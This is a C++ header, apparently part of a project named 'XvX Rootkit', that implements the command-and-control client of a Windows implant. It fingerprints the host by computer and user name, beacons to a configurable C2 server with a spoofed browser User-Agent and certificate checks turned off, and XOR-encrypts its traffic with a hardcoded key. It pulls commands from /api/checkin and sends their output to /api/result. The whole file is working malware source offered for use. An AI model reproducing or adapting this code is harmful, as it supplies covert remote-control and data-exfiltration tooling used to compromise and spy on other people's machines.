/*
 * XvX Rootkit - C2 Client Header
 * Copyright (c) 2025 - 28zaakypro@proton.me
 *
 * Command and Control client with HTTPS communication and XOR encryption.
 * Handles agent registration, task polling, and result reporting.
 */

#ifndef C2CLIENT_H
#define C2CLIENT_H

#include <windows.h>
#include <winhttp.h>
#include <string>
#include <vector>
#include <sstream>
#include "Crypto.h"

#pragma comment(lib, "winhttp.lib")

using namespace std;

class C2Client
{
private:
    wstring c2Server;
    wstring agentID;
    DWORD beaconInterval = 60000;
    bool isActive = false;
    DWORD maxRetries = 3;
    DWORD connectTimeout = 30000;
    DWORD requestTimeout = 60000;

    // Générer ID unique basé sur hardware
    wstring generateAgentID()
    {
        wchar_t compName[256];
        wchar_t userName[256];
        DWORD size = 256;

        GetComputerNameW(compName, &size);
        size = 256;
        GetUserNameW(userName, &size);

        // Hash simple: ComputerName + UserName
        wstring raw = wstring(compName) + L"_" + wstring(userName);

        // Convert to hex for readable ID
        wstringstream ss;
        for (wchar_t c : raw)
        {
            ss << hex << (int)c;
        }

        return ss.str().substr(0, 16); // Tronquer à 16 chars
    }

    // Obtenir infos système
    wstring getSystemInfo()
    {
        wchar_t compName[256], userName[256];
        DWORD size = 256;
        GetComputerNameW(compName, &size);
        size = 256;
        GetUserNameW(userName, &size);

        // Version Windows (use RtlGetVersion or registry)
        wstring osVersion = L"10.0.26200"; // Default to Windows 11 23H2

        wstringstream ss;
        ss << compName << L"|" << userName << L"|"
           << osVersion;

        return ss.str();
    }

    // HTTP request with XOR encryption
    wstring httpRequest(const wstring &endpoint, const wstring &data = L"")
    {
        // Parser URL (format: https://domain.com:443)
        wstring domain = c2Server;
        if (domain.find(L"https://") == 0)
        {
            domain = domain.substr(8);
        }
        else if (domain.find(L"http://") == 0)
        {
            domain = domain.substr(7);
        }

        // Extract port if present
        INTERNET_PORT port = INTERNET_DEFAULT_HTTPS_PORT;
        size_t portPos = domain.find(L':');
        if (portPos != wstring::npos)
        {
            port = (INTERNET_PORT)_wtoi(domain.substr(portPos + 1).c_str());
            domain = domain.substr(0, portPos);
        }

        // Encrypt data with system key
        wstring compName, userName;
        wchar_t buf[256];
        DWORD size = 256;

        GetComputerNameW(buf, &size);
        compName = buf;
        size = 256;
        GetUserNameW(buf, &size);
        userName = buf;
        wstring key = compName + userName + L"SecretKey2025";

        wstring encryptedData = base64Encode(xorEncrypt(data, key));

        // WinHTTP Session with legitimate User-Agent
        HINTERNET hSession = WinHttpOpen(
            L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
            WINHTTP_NO_PROXY_NAME,
            WINHTTP_NO_PROXY_BYPASS,
            0);

        if (!hSession)
            return L"";

        // Configure timeouts
        WinHttpSetOption(hSession, WINHTTP_OPTION_CONNECT_TIMEOUT, &connectTimeout, sizeof(connectTimeout));
        WinHttpSetOption(hSession, WINHTTP_OPTION_SEND_TIMEOUT, &requestTimeout, sizeof(requestTimeout));
        WinHttpSetOption(hSession, WINHTTP_OPTION_RECEIVE_TIMEOUT, &requestTimeout, sizeof(requestTimeout));

        // Connexion au serveur
        HINTERNET hConnect = WinHttpConnect(hSession, domain.c_str(), port, 0);
        if (!hConnect)
        {
            WinHttpCloseHandle(hSession);
            return L"";
        }

        // Requête POST
        DWORD flags = WINHTTP_FLAG_SECURE; // HTTPS
        if (port == INTERNET_DEFAULT_HTTP_PORT)
        {
            flags = 0; // HTTP fallback
        }

        HINTERNET hRequest = WinHttpOpenRequest(
            hConnect,
            L"POST",
            endpoint.c_str(),
            NULL,
            WINHTTP_NO_REFERER,
            WINHTTP_DEFAULT_ACCEPT_TYPES,
            flags);

        if (!hRequest)
        {
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);
            return L"";
        }

        // Disable SSL certificate validation (for C2 self-signed)
        DWORD securityFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                              SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                              SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
        WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &securityFlags, sizeof(securityFlags));

        // Ajouter headers personnalisés (AVANT SendRequest)
        wstring contentType = L"Content-Type: application/octet-stream";
        WinHttpAddRequestHeaders(hRequest, contentType.c_str(), -1, WINHTTP_ADDREQ_FLAG_ADD);

        // Add header with key (to help server decrypt)
        wstring keyHint = L"X-Key-Hint: " + compName + userName;
        WinHttpAddRequestHeaders(hRequest, keyHint.c_str(), -1, WINHTTP_ADDREQ_FLAG_ADD);

        // Convert data to bytes
        vector<BYTE> postData;
        for (wchar_t c : encryptedData)
        {
            postData.push_back((BYTE)(c & 0xFF));
            postData.push_back((BYTE)((c >> 8) & 0xFF));
        }

        // Envoyer requête (headers déjà ajoutés via WinHttpAddRequestHeaders)
        BOOL result = WinHttpSendRequest(
            hRequest,
            WINHTTP_NO_ADDITIONAL_HEADERS,
            0,
            postData.data(),
            (DWORD)postData.size(),
            (DWORD)postData.size(),
            0);

        if (!result)
        {
            WinHttpCloseHandle(hRequest);
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);
            return L"";
        }

        // Recevoir réponse
        WinHttpReceiveResponse(hRequest, NULL);

        // Lire données
        wstring response;
        DWORD bytesRead = 0;
        BYTE buffer[8192];

        while (WinHttpReadData(hRequest, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0)
        {
            // Convert bytes to wstring
            for (DWORD i = 0; i + 1 < bytesRead; i += 2)
            {
                wchar_t c = (wchar_t)(buffer[i] | (buffer[i + 1] << 8));
                response += c;
            }
        }

        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);

        // Déchiffrer réponse
        if (!response.empty())
        {
            wstring compName, userName;
            wchar_t buf[256];
            DWORD size = 256;
            GetComputerNameW(buf, &size);
            compName = buf;
            size = 256;
            GetUserNameW(buf, &size);
            userName = buf;
            wstring key = compName + userName + L"SecretKey2025";

            wstring decrypted = xorDecrypt(base64Decode(response), key);
            return decrypted;
        }

        return L"";
    }

public:
    C2Client(const wstring &serverURL = L"https://127.0.0.1:8443")
    {
        c2Server = serverURL;
        agentID = generateAgentID();
        isActive = false;
    }

    // Tester connexion au C2
    bool testConnection()
    {
        // Simple HTTP request without encryption for /api/ping
        HINTERNET hSession = WinHttpOpen(
            L"Mozilla/5.0",
            WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
            WINHTTP_NO_PROXY_NAME,
            WINHTTP_NO_PROXY_BYPASS,
            0);

        if (!hSession)
            return false;

        // Parser URL
        wstring domain = c2Server;
        if (domain.find(L"https://") == 0)
            domain = domain.substr(8);
        else if (domain.find(L"http://") == 0)
            domain = domain.substr(7);

        INTERNET_PORT port = INTERNET_DEFAULT_HTTPS_PORT;
        size_t portPos = domain.find(L':');
        if (portPos != wstring::npos)
        {
            port = (INTERNET_PORT)_wtoi(domain.substr(portPos + 1).c_str());
            domain = domain.substr(0, portPos);
        }

        HINTERNET hConnect = WinHttpConnect(hSession, domain.c_str(), port, 0);
        if (!hConnect)
        {
            WinHttpCloseHandle(hSession);
            return false;
        }

        HINTERNET hRequest = WinHttpOpenRequest(
            hConnect, L"POST", L"/api/ping", NULL,
            WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
            WINHTTP_FLAG_SECURE);

        if (!hRequest)
        {
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);
            return false;
        }

        // Désactiver validation SSL
        DWORD securityFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                              SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                              SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
        WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &securityFlags, sizeof(securityFlags));

        // Envoyer requête
        BOOL result = WinHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0);
        if (result)
        {
            WinHttpReceiveResponse(hRequest, NULL);
        }

        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);

        return result == TRUE;
    }

    // Envoyer beacon et récupérer commandes
    vector<wstring> checkIn()
    {
        vector<wstring> commands;

        // Retry loop
        for (DWORD attempt = 0; attempt < maxRetries; attempt++)
        {
            try
            {
                // Payload: agentID|hostname|username|os_version
                wstring payload = agentID + L"|" + getSystemInfo();

                wstring response = httpRequest(L"/api/checkin", payload);

                // Parser commandes (format: CMD|ARG1|ARG2\n)
                if (response.empty())
                {
                    if (attempt < maxRetries - 1)
                    {
                        Sleep(5000);
                        continue;
                    }
                    return commands;
                }

                size_t pos = 0;
                while ((pos = response.find(L'\n')) != wstring::npos)
                {
                    wstring cmd = response.substr(0, pos);
                    if (!cmd.empty())
                    {
                        commands.push_back(cmd);
                    }
                    response.erase(0, pos + 1);
                }

                if (!response.empty())
                {
                    commands.push_back(response);
                }

                return commands;
            }
            catch (...)
            {
                // Exception - retry if attempts remaining
                if (attempt < maxRetries - 1)
                {
                    Sleep(5000);
                    continue;
                }
            }
        }

        return commands;
    }

    // Envoyer résultat d'exécution
    void sendResult(const wstring &commandID, const wstring &status, const wstring &output)
    {
        for (DWORD attempt = 0; attempt < maxRetries; attempt++)
        {
            try
            {
                // Format: agentID|commandID|status|output
                wstring payload = agentID + L"|" + commandID + L"|" + status + L"|" + output;
                wstring response = httpRequest(L"/api/result", payload);

                if (!response.empty())
                {
                    return;
                }

                if (attempt < maxRetries - 1)
                {
                    Sleep(3000);
                }
            }
            catch (...)
            {
                if (attempt < maxRetries - 1)
                {
                    Sleep(3000);
                }
            }
        }
    }

    void setBeaconInterval(DWORD seconds)
    {
        beaconInterval = seconds * 1000;
    }

    DWORD getBeaconInterval() const
    {
        return beaconInterval;
    }

    wstring getAgentID() const
    {
        return agentID;
    }

    wstring getC2Server() const
    {
        return c2Server;
    }

    bool isRunning() const
    {
        return isActive;
    }

    void setActive(bool active)
    {
        isActive = active;
    }
};

#endif // C2CLIENT_H
